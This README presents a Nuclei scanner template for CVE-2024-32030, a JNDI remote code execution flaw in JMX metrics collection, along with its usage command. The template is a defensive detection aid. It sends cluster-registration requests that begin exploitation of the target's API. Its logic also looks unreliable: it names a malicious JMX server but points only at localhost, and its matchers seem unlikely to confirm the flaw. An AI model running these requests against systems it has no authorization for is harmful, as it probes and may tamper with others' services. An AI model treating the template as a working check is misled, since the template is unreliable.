
# CVE-2024-32030 Nuclei Template

## Description
This repository contains a Nuclei template for detecting the CVE-2024-32030 vulnerability. This vulnerability allows for remote code execution via JMX Metrics Collection JNDI Resolution.

## Vulnerability Details
- **ID:** CVE-2024-32030
- **Name:** JMX Metrics Collection JNDI RCE
- **Author:** Hüseyin TINTAŞ
- **Severity:** Critical
- **Description:** This template checks for the presence of the vulnerability by attempting to connect to a malicious JMX server.
- **Tags:** cve, cve2024, jmx, rce, cve2024-32030

## Template
```yaml
id: CVE-2024-32030

info:
  name: CVE-2024-32030 JMX Metrics Collection JNDI RCE
  author: Hüseyin TINTAŞ
  severity: critical
  description: >
    CVE-2024-32030 JMX Metrics Collection JNDI Resolution Remote Code Execution Vulnerability.
    This template checks for the presence of the vulnerability by attempting to connect to a malicious JMX server.
  tags: cve, cve2024, jmx, rce, cve2024-32030

requests:
  - method: POST
    path:
      - "{{BaseURL}}/api/clusters"
    headers:
      Content-Type: "application/json"
    body: |
      {
        "name": "malicious-cluster",
        "bootstrapServers": ["127.0.0.1:1718"],
        "metrics": {
          "type": "JMX",
          "port": 1718
        }
      }
    matchers:
      - type: word
        part: body
        words:
          - "malicious-cluster added successfully"

  - method: GET
    path:
      - "{{BaseURL}}/api/clusters/malicious-cluster"
    matchers:
      - type: word
        part: body
        words:
          - "malicious-cluster"

  - method: GET
    path:
      - "{{BaseURL}}/api/clusters/malicious-cluster/metrics"
    matchers:
      - type: word
        part: body
        words:
          - "metrics"
```

## Usage
To use this template, save it as `cve-2024-32030.yaml` and run it with Nuclei:
```sh
nuclei -t CVE-2024-32030.yaml -u http://target-server
```

## Contact

For any inquiries or further information, you can reach out to me through:

- [LinkedIn](https://www.linkedin.com/in/huseyintintas/)
- [Twitter](https://twitter.com/1337stif)
